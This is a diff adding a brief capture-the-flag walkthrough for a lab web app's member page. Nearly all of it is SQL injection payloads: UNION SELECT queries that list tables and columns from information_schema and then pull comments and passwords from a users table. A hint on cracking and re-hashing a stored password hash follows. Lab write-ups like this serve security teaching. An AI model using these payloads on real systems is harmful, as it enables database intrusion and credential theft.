@@ -1,0 +1,11 @@
+Goto http://10.111.1.21/?page=member
+
+Finding out all tables in the db '0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES'
+
+Finding out all the columns in the db '0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS'
+
+Lets look at users comments and their countersign '1 or 1=1 UNION SELECT Commentaire, countersign FROM users'
+
+We can see the tip "Decrypt this password -> then lower all the char. Sh256 on it and it's good ! 5ff9d0165b4f92b14994e5c685cdce28"
+
+After that we have the flag.
